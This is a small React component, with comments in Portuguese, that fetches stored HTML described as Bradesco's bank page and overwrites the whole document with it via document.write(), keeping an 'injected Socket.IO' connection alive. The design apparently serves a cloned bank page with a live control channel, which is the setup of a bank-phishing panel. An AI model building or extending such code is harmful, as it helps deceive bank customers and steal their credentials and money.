import { useEffect } from 'react';

export default function Cliente() {
  useEffect(() => {
    // Buscar o HTML do Bradesco via tRPC
    fetch('/api/trpc/cliente.getHtml')
      .then(res => res.json())
      .then(data => {
        // Estrutura tRPC: result.data.json.html
        const html = data?.result?.data?.json?.html;
        if (html) {
          // Usar document.write() para substituir a página inteira
          // Isso permite que o Socket.IO injetado funcione corretamente
          document.open();
          document.write(html);
          document.close();
        } else {
          document.write('<p style="color: red; padding: 20px;">HTML não encontrado na resposta</p>');
        }
      })
      .catch(err => {
        console.error('[CLIENTE] Erro:', err);
        document.write(`<p style="color: red; padding: 20px;">Erro ao carregar página: ${err.message}</p>`);
      });
  }, []);

  // Retornar vazio - a página será substituída por document.write()
  return null;
}
